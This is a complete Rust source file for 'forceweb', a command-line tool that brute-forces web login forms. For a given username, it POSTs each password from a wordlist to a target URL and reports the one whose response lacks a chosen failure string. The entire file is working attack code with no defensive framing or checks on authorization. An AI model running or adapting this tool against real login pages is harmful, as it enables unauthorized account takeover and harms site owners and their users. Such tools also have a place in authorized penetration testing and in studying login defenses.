use clap::Parser;
use colored::*;
use std::fs::File;
use std::io::{BufRead, BufReader};
use reqwest::blocking::Client;
use std::collections::HashMap;
use indicatif::{ProgressBar, ProgressStyle};
use std::fs;

#[derive(Parser)]
#[command(name = "forceweb", about = "Web login brute forcer")]
struct Args {
    #[arg(short = 'u', long)]
    url: String,

    #[arg(short = 'U', long)]
    usuario: String,

    #[arg(short = 'w', long)]
    wordlist: String,

    #[arg(short = 'f', long)]
    fail: String,

    #[arg(short = 'p', long, default_value = "username")]
    param_user: String,

    #[arg(short = 'P', long, default_value = "password")]
    param_pass: String,
}

fn main() {
    let banner = r#"
    ______                    _       __     __
   / ____/___  _____________  | |     / /__  / /_
  / /_  / __ \/ ___/ ___/ _ \ | | /| / / _ \/ __ \
 / __/ / /_/ / /  / /__/  __/ | |/ |/ /  __/ /_/ /
/_/    \____/_/   \___/\___/  |__/|__/\___/_.___/
        Web Login Brute Forcer | by buda-sys
"#;

    for (i, line) in banner.lines().enumerate() {
        let colored_line = match i % 5 {
            0 => line.red().bold(),
            1 => line.cyan().bold(),
            2 => line.green().bold(),
            3 => line.magenta().bold(),
            _ => line.truecolor(255, 165, 0).bold(),
        };
        println!("{}", colored_line);
    }

    let args = Args::parse();

    println!("{}", "[+] Iniciando Forceweb".cyan().bold());
    println!("[+] URL:          {}", args.url);
    println!("[+] Usuario:      {}", args.usuario);
    println!("[+] Wordlist:     {}", args.wordlist);
    println!("[+] Fail:         {}", args.fail);
    println!("[+] Param user:   {}", args.param_user);
    println!("[+] Param pass:   {}", args.param_pass);

    let file = match File::open(&args.wordlist) {
        Ok(f) => f,
        Err(_) => {
            println!("{}", "ERROR: No se pudo abrir el wordlist".red().bold());
            return;
        }
    };

    let reader = BufReader::new(file);
    let client = Client::new();

    let total = fs::read_to_string(&args.wordlist)
        .unwrap_or_default()
        .lines()
        .count() as u64;

    let pb = ProgressBar::new(total);
    pb.set_style(
        ProgressStyle::with_template(
            "[{elapsed_precise}] [{bar:45.cyan/blue}] {pos}/{len} | {msg}"
        )
        .unwrap()
        .progress_chars("█▓░"),
    );

    for linea in reader.lines() {
        let password = match linea {
            Ok(p) => p,
            Err(_) => continue,
        };

        pb.set_message(format!("Probando: {}", password));
        pb.inc(1);

        let mut params = HashMap::new();
        params.insert(args.param_user.as_str(), args.usuario.as_str());
        params.insert(args.param_pass.as_str(), password.as_str());

        let response = match client.post(&args.url).form(&params).send() {
            Ok(r) => r,
            Err(_) => {
                println!("{}", "ERROR: Fallo la peticion".red());
                continue;
            }
        };

        let body = response.text().unwrap_or_default();

        if !body.contains(&args.fail) {
            pb.finish_and_clear();
            println!("\n{}", "╔══════════════════════════════════════╗".green().bold());
            println!("{}", "║       PASSWORD ENCONTRADA            ║".green().bold());
            println!("{}", "╚══════════════════════════════════════╝".green().bold());
            println!("[+] URL:      {}", args.url.green());
            println!("[+] Usuario:  {}", args.usuario.green().bold());
            println!("[+] Password: {}", password.green().bold());
            return;
        }
    }

    pb.finish_and_clear();
    println!("\n{}", "[-] Password no encontrada en el wordlist".red().bold());
}
